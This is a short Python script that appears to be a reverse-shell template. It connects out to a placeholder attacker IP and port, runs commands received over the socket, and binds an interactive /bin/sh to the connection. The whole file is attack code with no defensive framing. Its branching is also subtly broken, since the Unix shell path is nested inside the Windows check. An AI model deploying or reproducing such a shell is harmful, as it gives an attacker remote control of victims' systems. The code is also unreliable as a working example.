#!/usr/python3

import os, socket, subprocess, sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{IP-Adress}", {Port}))

if sys.platform == "win32" or sys.platform == "cygwin":
    data = s.recv(1024)
    if data:
        cmd = data.decode("utf-8", errors="replace").strip()
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        STDOUT, STDERR = proc.communicate()

        s.send(STDOUT)
        s.send(STDERR)
    else:
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        proc = subprocess.call(["/bin/sh", "-i"])